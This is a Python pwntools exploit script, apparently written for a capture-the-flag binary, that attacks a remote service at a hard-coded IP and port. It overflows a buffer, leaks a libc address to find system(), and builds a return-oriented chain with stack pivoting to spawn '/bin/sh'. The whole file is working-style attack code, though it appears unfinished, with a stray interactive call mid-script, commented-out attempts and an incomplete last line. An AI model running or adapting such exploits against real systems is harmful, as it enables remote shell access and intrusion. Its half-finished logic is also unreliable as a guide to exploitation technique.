#!/usr/bin/python3
# -*- coding: UTF-8 -*-
from pwn import *

# context.arch = 'amd64' #設定目標機的資訊
lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# p = process('share/gawr_gura') #檔名
p = remote('140.115.59.7',10003)


print("send 5")
pause()
# p.send(b'7')
p.send(b'5')
print("send msg")
pause()
p.send(b'a'*0x2c)
p.interactive()
print("send get msg send 6")
pause()
p.send(b'6')

stdout = u64(p.recvuntil('Write')[7794:7800].ljust(8,b'\x00'))
base = stdout - lib.sym['_IO_2_1_stdout_']
syscalls = base + lib.sym['__libc_system']
success('base: 0x%x',base)
success('total: 0x%x',syscalls)


print("bask to main suggest ")
pause()
# p.send(b"a"*0x50 + p64(0x000000000040708c)+p64(0x0000000000401637))
p.send(b"a"*0x50 + p64(0x0000000000000000)+p64(0x0000000000401639))

print("send 5")
pause()
p.send(b'5')

print("send msg")
pause()
pop_rdi = 0x00000000004018c3
# sh = next(lib.search(b'/bin/sh'))+base
# sh = 0x41ee7
ret = 0x000000000040101a
pop_rsp = 0x00000000004018bd
sh = base + 0xe6c84
payload = b'a'*4 + p64(pop_rdi) + p64(sh) + p64(ret) + p64(syscalls)
# payload = b'a'*4 + p64(pop_rsp) +
p.send(b'a'*0x2c+p64(syscalls))

p.send( payload )

print("send get msg send 1")
pause()
p.send(b'1')

print("stack pivoiting suggest")
pause()
p.send(b"a"*0x50 + p64(0x0000000000407090)+p64(0x0000000000401637))
# p.send(p64(pop_rdi) + p64(sh) + p64(ret) + p64(syscalls) + b"a"*0x50 + p64(0x0000000000407090)+p64(0x0000000000401637))

p.interactive()


# system = 